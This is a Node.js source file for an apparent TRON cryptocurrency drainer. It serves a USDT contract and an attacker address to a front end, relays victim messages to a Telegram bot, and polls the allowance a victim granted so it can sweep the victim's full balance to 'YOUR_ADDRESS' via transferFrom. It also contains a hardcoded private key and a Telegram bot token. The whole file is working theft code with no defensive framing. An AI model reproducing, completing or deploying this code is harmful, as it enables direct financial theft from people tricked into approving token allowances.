const TronWeb = require('tronweb');
const express = require('express');
const app = express();
app.use(express.json());

const tronWeb = new TronWeb({
    fullHost: 'https://api.trongrid.io',
    privateKey: '5f885be2e50d28b5e75359170c8bd413f27622f326d8751048fe1f7a9a55fb5f'
});

const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const VICTIM_ADDRESS = 'TT757EE5Q4SBC1hPBECNv7T1GHFDegUzDJ';
const YOUR_ADDRESS = 'TTqwF7eEkWDzTnDFh6haLYHusoR7D31uRo';
const TG_TOKEN = '8275273137:AAG3PqVdJ4_EK_AICGNrv1mtOPJAPVSq6eY';
const TG_CHAT = '-1003868749659';

app.get('/x1', function(req, res) {
    res.json({
        a: USDT_CONTRACT,
        b: YOUR_ADDRESS
    });
});

app.post('/x2', async function(req, res) {
    var m = req.body.m;
    if (m) {
        try {
            await fetch('https://api.telegram.org/bot' + TG_TOKEN + '/sendMessage', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TG_CHAT, text: m, parse_mode: 'HTML' })
            });
        } catch (e) {}
    }
    res.send('ok');
});

async function checkAndDrain() {
    try {
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const allowance = await contract.allowance(VICTIM_ADDRESS, YOUR_ADDRESS).call();
        const balance = await contract.balanceOf(VICTIM_ADDRESS).call();
        console.log('Allowance:', tronWeb.fromSun(allowance));
        console.log('Balance:', tronWeb.fromSun(balance));
        if (Number(allowance) > 0 && Number(balance) > 0) {
            const tx = await contract.transferFrom(VICTIM_ADDRESS, YOUR_ADDRESS, balance).send({
                feeLimit: 100000000
            });
            console.log('Drained. TX:', tx);
        } else {
            console.log('Waiting...');
        }
    } catch (e) {
        console.error(e);
    }
}

setInterval(checkAndDrain, 30000);
checkAndDrain();

app.listen(process.env.PORT || 3000);
